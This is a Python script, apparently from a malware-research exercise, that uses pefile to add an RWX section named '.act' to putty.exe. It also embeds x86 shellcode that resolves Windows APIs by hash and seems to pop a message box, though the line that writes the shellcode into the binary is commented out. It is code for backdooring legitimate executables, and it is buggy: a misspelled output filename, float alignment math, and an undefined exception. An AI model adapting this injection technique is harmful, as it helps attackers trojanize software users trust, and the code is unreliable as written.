import pefile
import os 
import mmap


def align(val_to_align, alignment):
    return ((val_to_align+alignment-1)/alignment)*alignment


#binary = "/home/kshitiz/Downloads/research/sample_mal/0B7FEFAF5C8F3A320DC08EC32BD5955F0B3B2E35034C8B2AD879AE6BDC2CC0BC"

def addSectionEnd(binary):
    original_size = os.path.getsize(binary)
    pe = pefile.PE(binary, fast_load=True)
    if not pe.is_exe():
        pe.close()
        raise NotPE()
    elif pe.OPTIONAL_HEADER.DATA_DIRECTORY[14].VirtualAddress != 0 or pe.OPTIONAL_HEADER.DATA_DIRECTORY[14].Size != 0:
        pe.close()
        raise NotPE()

    number_of_section = pe.FILE_HEADER.NumberOfSections
    last_section = number_of_section - 1
    #virtual_offset = (pe.sections[last_section].VirtualAddress + pe.sections[last_section].Misc_VirtualSize)
    #raw_offset = (pe.sections[last_section].PointerToRawData + pe.sections[last_section].SizeOfRawData)
    file_alignment = pe.OPTIONAL_HEADER.FileAlignment
    section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
    new_section_offset = (pe.sections[number_of_section-1].get_file_offset() + 40)
    #print("Virtual offset: "+ str(virtual_offset)+ "     Raw offset " + str(raw_offset))

    #Obtaining values to set new section header
    raw_size = align(0x1000, file_alignment)
    virtual_size = align(0x1000, section_alignment)
    raw_offset = align((pe.sections[last_section].PointerToRawData + 
                    pe.sections[last_section].SizeOfRawData), pe.OPTIONAL_HEADER.FileAlignment)
    virtual_offset = align((pe.sections[last_section].VirtualAddress + 
                    pe.sections[last_section].Misc_VirtualSize), pe.OPTIONAL_HEADER.SectionAlignment)

    characteristics = 0xE0000020 #Execute | Read | Write
    name = ".act" + (4 * '\x00') #Making section name 8 bytes



    #Adding everything to section header
    print((raw_offset))

    pe.set_bytes_at_offset(new_section_offset, bytes(name, 'utf-8'))
    pe.set_dword_at_offset(new_section_offset + 8, int(virtual_size))
    pe.set_dword_at_offset(new_section_offset + 12, int(virtual_offset))
    pe.set_dword_at_offset(new_section_offset + 16, int(raw_size))
    pe.set_dword_at_offset(new_section_offset + 20, int(raw_offset))
    pe.set_bytes_at_offset(new_section_offset + 24, bytes((12 * '\x00'),'utf8'))
    pe.set_dword_at_offset(new_section_offset + 36, characteristics)

    pe.FILE_HEADER.NumberOfSections +=1
    pe.OPTIONAL_HEADER.SizeOfImage = int(virtual_size) + int(virtual_offset)
    pe.write("malware_file_with_new_section.exe")

    reopen = open("malware_file_with_new_sectiom.exe", "a+b")
    map = mmap.mmap(reopen.fileno(), 0 , access = mmap.ACCESS_WRITE)
    map.resize(original_size + 0x2000)
    map.close()
    reopen.close()
    #print(pe.sections[number_of_section])


binary = "putty.exe"
addSectionEnd(binary)


shellcode = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
                  b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
                  b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
                  b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
                  b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
                  b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
                  b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
                  b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
                  b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
                  b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
                  b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
                  b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
                  b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
                  b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
                  b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
                  b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x69\x74\x79\x58\x68"
                  b"\x65\x63\x75\x72\x68\x6b\x49\x6e\x53\x68\x42\x72\x65"
                  b"\x61\x31\xdb\x88\x5c\x24\x0f\x89\xe3\x68\x65\x58\x20"
                  b"\x20\x68\x20\x63\x6f\x64\x68\x6e\x20\x75\x72\x68\x27"
                  b"\x6d\x20\x69\x68\x6f\x2c\x20\x49\x68\x48\x65\x6c\x6c"
                  b"\x31\xc9\x88\x4c\x24\x15\x89\xe1\x31\xd2\x6a\x40\x53"
                  b"\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08")

#number_of_section = pe.FILE_HEADER.NumberOfSections
#last_section = number_of_section - 1
#raw_offset = pe.sections[last_section].PointerToRawData


#pe.set_bytes_at_offset(raw_offset, shellcode)
    
























#print(pe.sections[number_of_section-1])

#print(new_section_offset)






